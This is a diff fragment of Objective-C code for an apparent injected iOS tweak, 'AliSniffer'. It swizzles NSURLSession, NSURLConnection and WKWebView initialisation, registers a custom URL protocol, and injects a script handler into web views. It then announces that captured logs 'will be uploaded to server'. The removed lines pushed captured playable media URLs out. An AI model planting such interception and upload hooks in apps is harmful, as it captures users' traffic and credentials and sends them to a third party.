+                    LOG(@"[AliSniffer] hooked resume on %@", n);
+                    hooked = YES;
+                    break;
                 }
             }
-            if (!hookedResume) LOG(@"[AliSniffer] WARNING: failed to hook resume on candidates");
+            if (!hooked) LOG(@"[AliSniffer] couldn't hook resume candidates");
 
-            // Hook NSURLSession dataTaskWithRequest:
+            // Hook NSURLSession dataTaskWithRequest: & dataTaskWithURL:
             Class NSURLSessionClass = NSClassFromString(@"NSURLSession");
             if (NSURLSessionClass) {
                 SEL sel = @selector(dataTaskWithRequest:);
                 Method m = class_getInstanceMethod(NSURLSessionClass, sel);
                 if (m) {
-                    orig_dataTaskWithRequest = (void *)method_getImplementation(m);
-                    method_setImplementation(m, (IMP)swz_dataTaskWithRequest);
+                    g_orig_dataTaskWithRequest = (void *)method_getImplementation(m);
+                    method_setImplementation(m, (IMP)swz_dataTaskWithRequest_debug);
                     LOG(@"[AliSniffer] hooked NSURLSession dataTaskWithRequest:");
+                }
+                SEL sel2 = @selector(dataTaskWithURL:);
+                Method m2 = class_getInstanceMethod(NSURLSessionClass, sel2);
+                if (m2) {
+                    g_orig_dataTaskWithURL = (void *)method_getImplementation(m2);
+                    method_setImplementation(m2, (IMP)swz_dataTaskWithURL_debug);
+                    LOG(@"[AliSniffer] hooked NSURLSession dataTaskWithURL:");
+                }
+            } else {
+                LOG(@"[AliSniffer] NSURLSession class not found");
+            }
+
+            // NSURLConnection sendAsynchronousRequest:
+            Class NSURLConnectionClass = NSClassFromString(@"NSURLConnection");
+            if (NSURLConnectionClass) {
+                SEL sel = @selector(sendAsynchronousRequest:queue:completionHandler:);
+                Method m = class_getClassMethod(NSURLConnectionClass, sel);
+                if (m) {
+                    g_orig_sendAsync = (void *)method_getImplementation(m);
+                    method_setImplementation(m, (IMP)swz_sendAsync_debug);
+                    LOG(@"[AliSniffer] hooked NSURLConnection sendAsynchronousRequest:");
                 } else {
-                    LOG(@"[AliSniffer] WARNING: dataTaskWithRequest: not found");
+                    LOG(@"[AliSniffer] NSURLConnection sendAsynchronousRequest: not found");
                 }
             }
 
-            // Hook NSURLSessionConfiguration class methods (use metaclass)
-            Class Cfg = NSClassFromString(@"NSURLSessionConfiguration");
-            if (Cfg) {
-                Method dm = class_getClassMethod(Cfg, @selector(defaultSessionConfiguration));
-                if (dm) { orig_defCfg = (void *)method_getImplementation(dm); method_setImplementation(dm, (IMP)swz_defCfg); LOG(@"[AliSniffer] hooked defaultSessionConfiguration"); }
-                Method em = class_getClassMethod(Cfg, @selector(ephemeralSessionConfiguration));
-                if (em) { orig_ephCfg = (void *)method_getImplementation(em); method_setImplementation(em, (IMP)swz_ephCfg); LOG(@"[AliSniffer] hooked ephemeralSessionConfiguration"); }
-            }
+            // Register NSURLProtocol
+            @try {
+                [NSURLProtocol registerClass:[_DebugProtoUpload class]];
+                LOG(@"[AliSniffer] registered _DebugProtoUpload");
+            } @catch (NSException *e) { LOG(@"[AliSniffer] registerClass exception: %@", e); }
 
-            // AVPlayer hooks
-            Class AVP = NSClassFromString(@"AVPlayer");
-            if (AVP) {
-                SEL selRep = sel_registerName("replaceCurrentItemWithPlayerItem:");
-                Method mr = class_getInstanceMethod(AVP, selRep);
-                if (mr) { orig_replaceCurrentItem = (void *)method_getImplementation(mr); method_setImplementation(mr, (IMP)swz_replaceCurrentItem); LOG(@"[AliSniffer] hooked AVPlayer.replaceCurrentItemWithPlayerItem:"); }
-                SEL selPlay = sel_registerName("playImmediatelyAtRate:");
-                Method mp = class_getInstanceMethod(AVP, selPlay);
-                if (mp) { orig_playImmediatelyAtRate = (void *)method_getImplementation(mp); method_setImplementation(mp, (IMP)swz_playImmediatelyAtRate); LOG(@"[AliSniffer] hooked AVPlayer.playImmediatelyAtRate:"); }
-            } else {
-                LOG(@"[AliSniffer] AVPlayer class not present");
-            }
-
-            // WKWebView hook
+            // WKWebView init swizzle and handler add
             Class WK = NSClassFromString(@"WKWebView");
             if (WK) {
                 Method m = class_getInstanceMethod(WK, @selector(initWithFrame:configuration:));
-                if (m) { orig_WK_init = (void *)method_getImplementation(m); method_setImplementation(m, (IMP)swz_WK_init); LOG(@"[AliSniffer] hooked WKWebView initWithFrame:configuration:"); }
+                if (m) {
+                    g_orig_wkinit = (void *)method_getImplementation(m);
+                    method_setImplementation(m, (IMP)swz_wkinit_upload);
+                    LOG(@"[AliSniffer] hooked WKWebView initWithFrame:configuration:");
+                }
+                // Add a global handler class to be used when WK init occurs. We can't directly access the config instance here,
+                // but many apps create WKWebView after the swizzle and our swz_wkinit_upload will add user script. To ensure message handling,
+                // add observer to attach handler when a config is available: we will try to add handler to existing configs too.
+                _UploadWKHandler *h = [_UploadWKHandler new];
+                // try to attach to any existing WKWebView configurations (best-effort)
+                @try {
+                    NSArray *windows = UIApplication.sharedApplication.windows;
+                    for (UIWindow *w in windows) {
+                        for (UIView *v in w.subviews) {
+                            if ([v isKindOfClass:[NSClassFromString(@"WKWebView") class]]) {
+                                id web = v;
+                                id cfg = [web valueForKey:@"configuration"];
+                                if (cfg) {
+                                    id ucc = [cfg valueForKey:@"userContentController"];
+                                    if (ucc && [ucc respondsToSelector:@selector(addScriptMessageHandler:name:)]) {
+                                        [ucc performSelector:@selector(addScriptMessageHandler:name:) withObject:h withObject:@"_dbg"];
+                                        LOG(@"[AliSniffer] attached _dbg handler to existing WK config");
+                                    }
+                                }
+                            }
+                        }
+                    }
+                } @catch(...) {}
             }
 
-#if SNIFFER_ENABLE_POPUP
-            ShowPopupIfNeeded(@"AliSniffer", @"Safe enhanced hooks installed (debug ON)");
-#endif
+            // Show popup to indicate installed
+            dispatch_async(dispatch_get_main_queue(), ^{
+                UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"AliSniffer Debug Upload" message:@"Debug upload hooks installed. Logs will be uploaded to server." preferredStyle:UIAlertControllerStyleAlert];
+                [ac addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
+                UIWindow *w = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
+                UIViewController *vc = w.rootViewController;
+                while (vc.presentedViewController) vc = vc.presentedViewController;
+                if (vc) [vc presentViewController:ac animated:YES completion:nil];
+            });
 
-            [NSTimer scheduledTimerWithTimeInterval:kPushInterval repeats:YES block:^(__unused NSTimer * _Nonnull t) {
-                if (g_lastPlayableURL.length) {
-                    NSMutableDictionary *p = [NSMutableDictionary dictionary];
-                    p[@"url"] = g_lastPlayableURL;
-                    p[@"time"] = @([[NSDate date] timeIntervalSince1970]);
-                    PushJSON_async(p);
-                }
-            }];
-
-            LOG(@"[AliSniffer] safe init done");
+            LOG(@"[AliSniffer] debug upload init done. Reproduce playback now.");
         });
     }
 }
